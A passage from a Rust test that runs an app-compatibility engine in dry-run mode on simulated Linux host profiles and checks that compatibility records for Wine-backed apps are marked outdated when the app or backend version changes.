        (OsFamily::Linux, Some(LinuxDistro::Ubuntu)),
    ] {
        let sim_host = HostProfile::synthetic(os, distro, CpuArch::X86_64);
        let sim_engine = AppBridgeEngine::with_host_and_data_root(
            sim_host,
            tmp.path().join(format!("sim-{os:?}")),
        )
        .unwrap();
        let app = sim_engine.inspect(&safe_deb).unwrap();
        let plan = sim_engine.create_run_plan_for(&app);
        let result = sim_engine
            .execute(&app, &plan, ExecutionMode::DryRun)
            .unwrap();
        assert_eq!(result.launch_receipt.exit_code, 0);
    }

    // Priority 5: CompatibilityTrustLevel & version staleness check
    let entry = CompatibilityEntry {
        app_id: "org.example.app".to_string(),
        app_version: "1.0.0".to_string(),
        binary_sha256: Some("deadbeef".to_string()),
        host_os: OsFamily::Linux,
        host_distro: Some("Arch Linux".to_string()),
        arch: CpuArch::X86_64,
        kernel_version: Some("6.12.0".to_string()),
        backend: BackendId::Wine,
        backend_version: "wine-11.21".to_string(),
        graphics_driver: Some("Mesa 24.3".to_string()),
        status: VerificationStatus::Verified,
        trust_level: CompatibilityTrustLevel::Verified,
        evidence: "Automated CI run".to_string(),
        execution_log_excerpt: Some("exit=0".to_string()),
        recorded_at: Utc::now(),
    };
    assert!(!entry.is_outdated_for("1.0.0", "wine-11.21"));
    assert!(entry.is_outdated_for("2.0.0", "wine-11.21"));
    assert!(entry.is_outdated_for("1.0.0", "wine-12.0"));
}
